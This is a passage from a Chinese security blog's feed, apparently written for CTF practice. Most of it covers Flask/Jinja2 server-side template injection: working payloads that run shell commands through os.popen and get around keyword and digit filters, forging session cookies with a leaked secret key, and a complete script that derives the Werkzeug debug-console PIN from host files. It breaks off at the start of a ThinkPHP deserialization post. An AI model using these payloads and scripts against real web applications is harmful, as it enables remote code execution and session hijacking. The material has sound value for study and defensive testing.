&lt;li&gt;索引中的&lt;code&gt;[]&lt;/code&gt;，使用&lt;code&gt;pop()、__getitem__()&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{{().__class__.__base__.__subclasses__().__getitem__(133).__init__.__globals__.popen(&#39;whoami&#39;).read()}}
 
{{().__class__.__base__.__subclasses__().pop(133).__init__.__globals__.popen(&#39;whoami&#39;).read()}}
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;当绕过关键字限制使用&lt;code&gt;[]&lt;/code&gt;时&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{{&amp;quot;&amp;quot;.__getattribute__(&amp;quot;__cla&amp;quot;+&amp;quot;ss__&amp;quot;).__base__}}
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;过滤数字&#34;&gt;过滤数字&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;循环找类直接利用&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{% for i in &amp;quot;&amp;quot;.__class__.__base__.__subclasses__() %}{% if i.__name__==&#39;Popen&#39; %}{{ i.__init__.__globals__.__getitem__(&#39;os&#39;).popen(&#39;whoami&#39;).read()}}{% endif %}{% endfor %}

# 实际上这里找到的是subprocess.Popen类，然后利用os模块的popen去执行命令
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;用已有对象或函数直接利用&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;使用&lt;code&gt;lipsum、url_for、get_flashed_messages&lt;/code&gt;函数或&lt;code&gt;request&lt;/code&gt;对象直接利用，不需要使用数字进行索引取值。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{{lipsum|attr(&amp;quot;__globals__&amp;quot;)|attr(&amp;quot;__getitem__&amp;quot;)(&amp;quot;os&amp;quot;)|attr(&amp;quot;popen&amp;quot;)(&amp;quot;cat flag&amp;quot;)|attr(&amp;quot;read&amp;quot;)()}}
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;进阶利用&#34;&gt;进阶利用&lt;/h2&gt;
&lt;h3 id=&#34;flask-session利用&#34;&gt;flask session利用&lt;/h3&gt;
&lt;h4 id=&#34;session结构&#34;&gt;session结构&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;eyJ1c2VyX2lkIjo2fQ.XA3a4A.R-ReVnWT8pkpFqM_52MabkZYIkY&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;以&lt;code&gt;.&lt;/code&gt;分为三个部分：1)第一部分为session data进行base64后的结果，2)第二部分为时间戳，flask中时间戳超过31天视为无效，3)第三部分是session data、 时间戳、flask中的&lt;code&gt;secret key&lt;/code&gt;通过sha算法进行hash后的结果。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;注意：&lt;/p&gt;
&lt;p&gt;其中所有base64部分去掉了&lt;code&gt;=&lt;/code&gt;号，当decode失败可填入部分&lt;code&gt;=&lt;/code&gt;号补全;&lt;/p&gt;
&lt;p&gt;解时间戳：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;int.from_bytes(base64_decode(session-timestamp),byteorder=&#39;big&#39;)
&lt;/code&gt;&lt;/pre&gt;&lt;/blockquote&gt;
&lt;h4 id=&#34;伪造session&#34;&gt;伪造session&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;通过&lt;code&gt;{{config}}&lt;/code&gt;获取泄露的secret_key：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 1253; 
			flex-basis: 3008px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/ssti/image-20220203154405927.png&#34; data-size=&#34;1592x127&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/ssti/image-20220203154405927.png&#34;
			width=&#34;1592&#34;
			height=&#34;127&#34;
			srcset=&#34;https://coollllllll.github.io/p/ssti/image-20220203154405927_huf6abb855324dfaee42f1892667d68b35_65630_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/ssti/image-20220203154405927_huf6abb855324dfaee42f1892667d68b35_65630_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;image-20220203154405927&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;image-20220203154405927&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;可利用&lt;code&gt;Flask Unsign&lt;/code&gt;工具伪造session：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;flask-unsign --sign --cookie &amp;quot;{&#39;logged_in&#39;: True}&amp;quot; --secret &#39;CHANGEME&#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 2300; 
			flex-basis: 5520px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/ssti/image-20220203155913837.png&#34; data-size=&#34;897x39&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/ssti/image-20220203155913837.png&#34;
			width=&#34;897&#34;
			height=&#34;39&#34;
			srcset=&#34;https://coollllllll.github.io/p/ssti/image-20220203155913837_hu933c34dc66a7d7478a6a19c5d5d222ab_16482_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/ssti/image-20220203155913837_hu933c34dc66a7d7478a6a19c5d5d222ab_16482_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;也可利用该工具解session(一般手动解就已经很方便)：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 1794; 
			flex-basis: 4306px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/ssti/image-20220203160155120.png&#34; data-size=&#34;987x55&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/ssti/image-20220203160155120.png&#34;
			width=&#34;987&#34;
			height=&#34;55&#34;
			srcset=&#34;https://coollllllll.github.io/p/ssti/image-20220203160155120_hucdff5e931c60050fe4999c3d0a4901ea_15668_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/ssti/image-20220203160155120_hucdff5e931c60050fe4999c3d0a4901ea_15668_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;尝试破解常见的secret_key:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 710; 
			flex-basis: 1705px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/ssti/image-20220203160332247.png&#34; data-size=&#34;995x140&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/ssti/image-20220203160332247.png&#34;
			width=&#34;995&#34;
			height=&#34;140&#34;
			srcset=&#34;https://coollllllll.github.io/p/ssti/image-20220203160332247_hu3ad9fa4757c6a2b9dbef421c5b32bbce_38320_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/ssti/image-20220203160332247_hu3ad9fa4757c6a2b9dbef421c5b32bbce_38320_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;flask-pin码利用&#34;&gt;flask PIN码利用&lt;/h3&gt;
&lt;p&gt;Flask在debug模式下可产生一个交互式shell，但需要输入一个PIN码，一台机器上多次重启Flask应用，PIN码值不改变表明存在一定规律。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;生成PIN码的脚本：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;itertools&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;chain&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;hashlib&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;probably_public_bits&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;
    &lt;span class=&#34;s1&#34;&gt;&amp;#39;cool&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# username&lt;/span&gt;
    &lt;span class=&#34;s1&#34;&gt;&amp;#39;flask.app&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# modname&lt;/span&gt;
    &lt;span class=&#34;s1&#34;&gt;&amp;#39;Flask&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# getattr(app, &amp;#39;__name__&amp;#39;, getattr(app.__class__, &amp;#39;__name__&amp;#39;))&lt;/span&gt;
    &lt;span class=&#34;s1&#34;&gt;&amp;#39;/home/cool/.local/lib/python3.9/site-packages/flask/app.py&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# getattr(mod, &amp;#39;__file__&amp;#39;, None)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;private_bits&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;52242275645&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;cdb9fdddb45e4f95b043309c818c3ff5&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# 第一个元素：str(uuid.getnode()),  /sys/class/net/eth0/address&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# 第二个元素：get_machine_id(), /etc/machine-id&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;h&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;hashlib&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sha1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bit&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;chain&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;probably_public_bits&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;private_bits&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;continue&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;isinstance&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;bit&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;utf-8&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;update&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;update&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;cookiesalt&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;cookie_name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;__wzd&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hexdigest&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()[:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;


&lt;span class=&#34;n&#34;&gt;num&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;None&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;num&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;None&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;update&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;pinsalt&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;num&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hexdigest&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;09d&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;rv&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;None&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rv&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;None&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;group_size&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;num&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;group_size&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;rv&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;-&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
                &lt;span class=&#34;n&#34;&gt;num&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;group_size&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rjust&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;group_size&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
                &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;num&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;group_size&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;rv&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;num&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;脚本中各参数的获取方法：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;username&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当前运行Flask应用的用户名，可读取/etc/passwd获取&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;modname&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一般默认&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;appname&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一般默认&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;路径&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;通过报错获取：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 351; 
			flex-basis: 844px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/ssti/image-20220203164001173.png&#34; data-size=&#34;598x170&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/ssti/image-20220203164001173.png&#34;
			width=&#34;598&#34;
			height=&#34;170&#34;
			srcset=&#34;https://coollllllll.github.io/p/ssti/image-20220203164001173_hu582dbb45c56f2b6739c044e90919e4b6_28693_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/ssti/image-20220203164001173_hu582dbb45c56f2b6739c044e90919e4b6_28693_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;网络地址&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;读取&lt;code&gt;/sys/class/net/eth0/address&lt;/code&gt;，并进行进制转换：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 1385; 
			flex-basis: 3324px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/ssti/image-20220203164517414.png&#34; data-size=&#34;554x40&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/ssti/image-20220203164517414.png&#34;
			width=&#34;554&#34;
			height=&#34;40&#34;
			srcset=&#34;https://coollllllll.github.io/p/ssti/image-20220203164517414_hu72191e721b6a0cee055289bdb888a8ef_8092_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/ssti/image-20220203164517414_hu72191e721b6a0cee055289bdb888a8ef_8092_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;int(&amp;quot;00:0c:29:e1:dd:3d&amp;quot;.replace(&amp;quot;:&amp;quot;, &amp;quot;&amp;quot;), 16)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 1277; 
			flex-basis: 3065px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/ssti/image-20220203164607833.png&#34; data-size=&#34;447x35&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/ssti/image-20220203164607833.png&#34;
			width=&#34;447&#34;
			height=&#34;35&#34;
			srcset=&#34;https://coollllllll.github.io/p/ssti/image-20220203164607833_hu2e336299985bdefcbe400589d8566356_5614_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/ssti/image-20220203164607833_hu2e336299985bdefcbe400589d8566356_5614_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;机器码&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;默认生成方式为先依次读取&lt;code&gt;/etc/machine-id&lt;/code&gt;和&lt;code&gt;/proc/sys/kernel/random/boot_id&lt;/code&gt;，读到其中一个则退出，继续读取&lt;code&gt;/proc/self/cgroup&lt;/code&gt;中第一行中以最右侧&lt;code&gt;/&lt;/code&gt;分割的右边部分内容，最后将两部分进行拼接得到机器码。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;不同版本中机器码的生成方式有区别&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;执行脚本：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 516; 
			flex-basis: 1240px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/ssti/image-20220203182045494.png&#34; data-size=&#34;274x53&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/ssti/image-20220203182045494.png&#34;
			width=&#34;274&#34;
			height=&#34;53&#34;
			srcset=&#34;https://coollllllll.github.io/p/ssti/image-20220203182045494_hu0eabe297fbfbcbacb93714592820b35d_6235_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/ssti/image-20220203182045494_hu0eabe297fbfbcbacb93714592820b35d_6235_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 1297; 
			flex-basis: 3113px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/ssti/image-20220203182035925.png&#34; data-size=&#34;480x37&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/ssti/image-20220203182035925.png&#34;
			width=&#34;480&#34;
			height=&#34;37&#34;
			srcset=&#34;https://coollllllll.github.io/p/ssti/image-20220203182035925_hub8eaa7c8f576b501b87ba31fb70e5dd2_7741_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/ssti/image-20220203182035925_hub8eaa7c8f576b501b87ba31fb70e5dd2_7741_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>thinkphp5.1.* - 反序列化</title>
        <link>https://coollllllll.github.io/p/php-5/</link>
        <pubDate>Fri, 09 Oct 2020 00:00:00 +0000</pubDate>
        
        <guid>https://coollllllll.github.io/p/php-5/</guid>
        <description>&lt;img src="https://coollllllll.github.io/p/php-5/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post thinkphp5.1.* - 反序列化" /&gt;&lt;h1 id=&#34;thinkphp51---反序列化&#34;&gt;thinkphp5.1.* - 反序列化&lt;/h1&gt;
&lt;h2 id=&#34;环境&#34;&gt;环境&lt;/h2&gt;
&lt;p&gt;thinkphp-5.1.37&lt;/p&gt;
&lt;p&gt;PHP 7.0.33&lt;/p&gt;
&lt;h2 id=&#34;反序列化触发链&#34;&gt;反序列化触发链&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;全局搜索&lt;code&gt;__destruct()&lt;/code&gt;关键字，找到漏洞的起点：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 153; 
			flex-basis: 367px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/php-5/image-20220222151402276.png&#34; data-size=&#34;601x392&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/php-5/image-20220222151402276.png&#34;
			width=&#34;601&#34;
			height=&#34;392&#34;
			srcset=&#34;https://coollllllll.github.io/p/php-5/image-20220222151402276_hu7ccc03757c84467b806a609e272e9f8a_37203_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/php-5/image-20220222151402276_hu7ccc03757c84467b806a609e272e9f8a_37203_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;跟进&lt;code&gt;removeFiles()&lt;/code&gt;&lt;/li&gt;
